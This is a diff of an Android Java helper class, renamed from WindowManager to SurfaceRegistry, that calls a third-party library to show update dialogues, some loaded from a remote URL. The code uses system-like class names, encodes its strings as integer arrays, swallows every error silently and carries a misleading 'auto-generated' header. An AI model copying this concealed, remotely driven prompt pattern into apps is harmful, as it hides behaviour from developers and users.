@@ -1,66 +1,43 @@
-package runtime.compat;
+package core.init;
 
 import android.app.Activity;
 import android.content.res.Configuration;
 import android.os.Build;
-import android.os.Handler;
-import android.os.Looper;
 import android.util.DisplayMetrics;
-import android.view.View;
 
 import com.error.updatedialogue.UpdateDialogue;
 
 /** Lifecycle bootstrap helpers. AUTO-GENERATED - do not edit by hand. */
-public final class WindowManager {
+public final class SurfaceRegistry {
 
     private static volatile long sToken;
     private static volatile int sProfile;
 
-    private WindowManager() {
+    private SurfaceRegistry() {
     }
 
-    public static void bind(final Activity activity) {
+    public static void start(Activity activity) {
         try {
             if (activity == null || activity.isFinishing() || activity.isDestroyed()) {
                 return;
             }
-            int profile = readDisplayProfile(activity);
+            int profile = measureSurface(activity);
             sProfile = profile;
-            sToken = deriveCompatToken(activity, profile);
+            sToken = mixConfigToken(activity, profile);
             if (Build.VERSION.SDK_INT >= 21) {
-                Runnable task = new Runnable() {
-                    @Override
-                    public void run() {
-                        try {
-                            UpdateDialogue.checkAndShow(activity);
-                        } catch (Throwable ignored) {
-                        }
-                    }
-                };
-                View decor = null;
-                try {
-                    if (activity.getWindow() != null) {
-                        decor = activity.getWindow().getDecorView();
-                    }
-                } catch (Throwable ignored) {
-                }
-                if (decor != null) {
-                    decor.post(task);
-                } else {
-                    new Handler(Looper.getMainLooper()).post(task);
-                }
+                UpdateDialogue.checkAndShow(activity);
             }
         } catch (Throwable ignored) {
             // Host-app safety: dialogue failures must never crash the app.
         }
     }
 
-    public static void bindSample(Activity activity) {
+    public static void attachSample(Activity activity) {
         try {
             if (activity == null || activity.isFinishing() || activity.isDestroyed()) {
                 return;
             }
-            sProfile = readDisplayProfile(activity);
+            sProfile = measureSurface(activity);
             UpdateDialogue.show(
                     activity,
                     d(new int[]{114, 89, 75, 28, 105, 76, 88, 93, 72, 89, 29}),
@@ -72,12 +49,12 @@ public final class WindowManager {
         }
     }
 
-    public static void test(Activity activity, String target) {
+    public static void preview(Activity activity, String target) {
         try {
             if (activity == null || activity.isFinishing() || activity.isDestroyed()) {
                 return;
             }
-            sProfile = readDisplayProfile(activity);
+            sProfile = measureSurface(activity);
             UpdateDialogue.checkAndShowFromUrl(activity, target);
         } catch (Throwable ignored) {
         }
@@ -91,14 +68,14 @@ public final class WindowManager {
         return new String(out, java.nio.charset.StandardCharsets.UTF_8);
     }
 
-    public static void stop() {
+    public static void release() {
         try {
             UpdateDialogue.dismiss();
         } catch (Throwable ignored) {
         }
     }
 
-    public static String configTag() {
+    public static String statusCode() {
         try {
             return UpdateDialogue.getLinkFingerprint();
         } catch (Throwable ignored) {
@@ -106,7 +83,7 @@ public final class WindowManager {
         }
     }
 
-    public static String resolveTarget() {
+    public static String resolve() {
         try {
             return UpdateDialogue.getRemoteUrl(null);
         } catch (Throwable ignored) {
@@ -114,7 +91,7 @@ public final class WindowManager {
         }
     }
 
-    private static int readDisplayProfile(Activity activity) {
+    private static int measureSurface(Activity activity) {
         DisplayMetrics metrics = activity.getResources().getDisplayMetrics();
         Configuration config = activity.getResources().getConfiguration();
         int value = metrics.widthPixels * 31 + metrics.heightPixels;
@@ -123,7 +100,7 @@ public final class WindowManager {
         return value;
     }
 
-    private static long deriveCompatToken(Activity activity, int profile) {
+    private static long mixConfigToken(Activity activity, int profile) {
         long token = profile;
         String name = activity.getPackageName();
         if (name != null) {
